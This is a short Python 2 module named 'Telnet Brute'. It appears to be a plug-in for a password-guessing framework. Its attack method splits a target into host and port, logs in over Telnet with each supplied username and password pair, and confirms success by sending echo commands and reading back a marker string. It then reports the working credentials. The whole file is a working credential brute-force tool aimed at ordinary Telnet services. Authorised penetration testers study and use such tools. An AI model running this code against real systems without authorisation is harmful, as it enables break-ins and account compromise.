#!/usr/bin/env python
#coding:utf-8
"""
  Author:   --<v1ll4n>
  Purpose: Telnet Brute
  Created: 03/16/17
"""

import unittest
import telnetlib

from ..core.base import ModBase

def do_telnet(Host, username, password, port=0):  

    try:
        # 连接Telnet服务器  
        tn = telnetlib.Telnet(Host, port, timeout=10)  
        #tn.set_debuglevel(2)  
    
        # 输入登录用户名  
        tn.read_until('ogin:', timeout=5) 
        #tn.read_very_lazy()
        tn.write(username + '\n')  
    
        # 输入登录密码  
        tn.read_until('assword', timeout=5)
        #tn.read_very_lazy()
        tn.write(password + '\n')  
    
        # 登录完毕后执行命令  
        tn.read_very_eager() 
        command = 'echo "aabbccdd""eeffgghh"'
        tn.write('%s\n' % command)
        tn.write('%s\n' % command)  
        tn.write('%s\n' % command)  
    
        #执行完毕后，终止Telnet连接（或输入exit退出）  
        #
        #
        _buffer = tn.read_until('aabbccddeeffgghh', timeout=3)
        if 'aabbccddeeffgghh' in _buffer:
            
            tn.close() # tn.write('exit\n') 
            return True
        else:
            raise StandardError()
    except:
        return False

########################################################################
class TELNETBRUTE(ModBase):
    """"""

    #----------------------------------------------------------------------
    def attack(self, payload):
        """"""
        assert len(payload) == 2
        username = payload[0]
        password = payload[1]
        
        if ':' in self.target:
            _ret = self.target.split(':')
            host = _ret[0]
            port = int(_ret[1])
        else:
            host = self.target
            port = 0
            
        
        result = do_telnet(host, username, password, port)
        return result, 'USERNAME:{username} | PASSWORD:{password}'.format(username=username,
                                                                          password=password)


